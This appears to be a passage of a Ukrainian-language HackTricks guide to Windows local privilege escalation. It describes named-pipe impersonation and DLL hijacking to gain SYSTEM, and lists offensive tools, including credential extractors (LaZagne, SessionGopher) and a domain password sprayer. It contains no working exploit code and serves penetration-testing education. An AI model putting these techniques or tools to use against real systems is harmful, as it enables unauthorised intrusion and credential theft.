**Ви можете знайти** [**приклад коду, що виконує запропоновану техніку тут**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Цю техніку використовує meterpreter для ескалації в `getsystem`. Техніка полягає в **створенні каналу, а потім створенні/зловживанні службою для запису в цей канал**. Тоді **сервер**, який створив канал, використовуючи привілей **`SeImpersonate`**, зможе **імплементувати токен** клієнта каналу (служба), отримуючи привілеї SYSTEM.\
Якщо ви хочете [**дізнатися більше про іменовані канали, вам слід прочитати це**](#named-pipe-client-impersonation).\
Якщо ви хочете прочитати приклад [**як перейти з високої цілісності до System, використовуючи іменовані канали, вам слід прочитати це**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Якщо вам вдасться **викрасти dll**, що **завантажується** процесом, що працює як **SYSTEM**, ви зможете виконати довільний код з цими дозволами. Тому Dll Hijacking також корисний для цього виду ескалації привілеїв, і, більше того, якщо значно **легше досягти з процесу з високою цілісністю**, оскільки він матиме **права на запис** у папки, що використовуються для завантаження dll.\
**Ви можете** [**дізнатися більше про Dll hijacking тут**](dll-hijacking/)**.**

### **From Administrator or Network Service to System**

{{#ref}}
https://github.com/sailay1996/RpcSsImpersonator
{{#endref}}

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Читати:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Найкращий інструмент для пошуку векторів ескалації локальних привілеїв Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Перевірка на неправильні налаштування та чутливі файли (**[**перевірте тут**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Виявлено.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Перевірка на деякі можливі неправильні налаштування та збір інформації (**[**перевірте тут**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Перевірка на неправильні налаштування**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Витягує інформацію про збережені сесії PuTTY, WinSCP, SuperPuTTY, FileZilla та RDP. Використовуйте -Thorough в локальному режимі.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Витягує облікові дані з Диспетчера облікових даних. Виявлено.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Розпилення зібраних паролів по домену**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh є спуфером PowerShell ADIDNS/LLMNR/mDNS/NBNS та інструментом "людина посередині".**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Основна перевірка привілеїв Windows**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **\~\~**\~\~ -- Пошук відомих вразливостей привілеїв (ЗАСТОСУВАННЯ для Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Локальні перевірки **(Потрібні права адміністратора)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Пошук відомих вразливостей привілеїв (потрібно скомпілювати за допомогою VisualStudio) ([**попередньо скомпільований**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Перераховує хост, шукаючи неправильні налаштування (більше інструмент для збору інформації, ніж для ескалації привілеїв) (потрібно скомпілювати) **(**[**попередньо скомпільований**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Витягує облікові дані з багатьох програм (попередньо скомпільований exe в github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Порт PowerUp на C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **\~\~**\~\~ -- Перевірка на неправильні налаштування (виконуваний файл попередньо скомпільований в github). Не рекомендується. Погано працює в Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Перевірка на можливі неправильні налаштування (exe з python). Не рекомендується. Погано працює в Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Інструмент, створений на основі цього посту (не потребує accesschk для правильної роботи, але може його використовувати).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Читає вихідні дані **systeminfo** та рекомендує робочі експлойти (локальний python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Читає вихідні дані **systeminfo** та рекомендує робочі експлойти (локальний python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Вам потрібно скомпілювати проект, використовуючи правильну версію .NET ([дивіться це](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Щоб побачити встановлену версію .NET на хості жертви, ви можете зробити:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## Бібліографія

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)\\
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)\\
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)\\
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)\\
- [https://www.youtube.com/watch?v=\_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)\\
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)\\
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)\\
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)\\
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)\\
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)\\
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)\\
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)\\
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)\\
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

{{#include ../../banners/hacktricks-training.md}}
